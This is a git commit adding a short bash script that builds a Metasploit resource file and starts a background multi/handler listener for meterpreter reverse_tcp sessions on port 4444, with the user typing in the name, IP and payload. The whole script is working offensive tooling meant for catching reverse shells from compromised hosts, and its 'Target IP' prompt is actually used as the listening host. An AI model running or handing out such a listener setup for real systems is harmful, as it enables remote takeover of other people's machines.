0045cef5de656d1b08c9841614f34da56db144a8
root <root@ip-172-31-18-188.eu-central-1.compute.internal>
2016-10-16 14:14:50 +0000

    This is a tcp shell script that creates a listener and a payload.

---
+++ CreateListner.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+
+echo "Choose Name"
+read m 
+echo  "Target IP"
+read ip
+echo "Select Payload"
+read p 
+echo "-------------"
+echo  "Name:$m"
+echo  "Target:$ip"
+echo  "Payload:$p"
+echo "---------------"
+touch ./$m
+echo use exploit/multi/handler >> $m
+echo set PAYLOAD $p/meterpreter/reverse_tcp >> $m
+echo set LHOST $ip >> $m
+echo set LPORT 4444 >>$m
+echo set ExitOnSession false >> $m
+echo exploit -j -z  >> $m
+
+sudo chmod +755  /home/ivan/ivdim/$m
+ 
+msfconsole -r /home/ivan/ivdim/$m
